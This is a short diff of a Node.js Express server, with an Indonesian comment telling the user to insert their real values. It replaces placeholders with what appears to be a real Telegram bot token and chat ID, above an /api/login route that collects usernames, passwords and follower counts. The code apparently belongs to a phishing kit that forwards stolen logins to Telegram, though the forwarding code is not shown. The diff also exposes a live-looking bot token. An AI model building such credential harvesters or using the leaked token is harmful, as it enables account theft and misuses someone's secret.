@@ -5,8 +5,8 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
 
 // GANTI DENGAN TOKEN DAN CHAT ID ASLI ANDA
-const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+const BOT_TOKEN = '8571006025:AAHh19imq5oUuOIX33znhfCTXC6xNix9Exo';
+const CHAT_ID = '6834832649';
 
 app.post('/api/login', async (req, res) => {
     const { username, password, followers } = req.body;
